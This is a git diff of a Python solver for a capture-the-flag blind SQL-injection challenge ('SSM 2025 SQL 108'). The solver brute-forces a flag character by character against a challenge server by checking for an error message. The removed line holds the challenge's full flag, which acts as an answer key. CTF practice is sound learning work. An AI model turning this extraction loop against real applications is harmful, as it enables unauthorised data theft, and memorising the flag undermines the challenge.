@@ -4,6 +4,8 @@ from urllib import parse
 import string
 import time
 
+# SSM 2025 SQL 108 problem. 
+
 class Blind_boolean:
   def __init__(self, final_answer, url_adress):
     
@@ -12,11 +14,9 @@ class Blind_boolean:
       possible_chr.append(chr)
     possible_chr = possible_chr + [str(i) for i in range(10)]
 
-    special_chr = ["å", "ä", "ö", "_", "!", "?", "%", "&", ":", "#", "+", "."]
-    for i in special_chr:
-      possible_chr.append(i)
-    possible_chr.append("}")
+    possible_chr += ["å", "ä", "ö", "_", "!", "?", "%", "&", ":", "#", "+", ".", "}"]
     self.letters_numbers = possible_chr
+
 
     self.final_answer = final_answer
     self.url_adress = url_adress
@@ -39,10 +39,7 @@ class Blind_boolean:
   
   def check_error_message(self):
     error_message = self.soup.find_all("div", "text-red-400 font-medium")
-    if error_message == []:
-      return True
-    else:
-      return False
+    return error_message == []
 
 
   def add_letter(self, string, bool):
@@ -70,14 +67,11 @@ class Blind_boolean:
 
 
 
-
-
-ssm_108 = Blind_boolean("Flaggan är SSM{j46_k4n_s3_äv3n_0m_j4g_är_bl1nd}", "http://ssmarkiv.ctfchall.se:50002/108?input=")
+ssm_108 = Blind_boolean("Flaggan är SSM{", "http://ssmarkiv.ctfchall.se:50002/108?input=")
 
 while ssm_108.answer_found == False and ssm_108.error == False:
   time.sleep(0.01)
   ssm_108.get_html_soup()
-
   if ssm_108.check_error_message() == True:
     print(ssm_108.final_answer + " is correct.")
     if ssm_108.final_answer[-1] == "}":
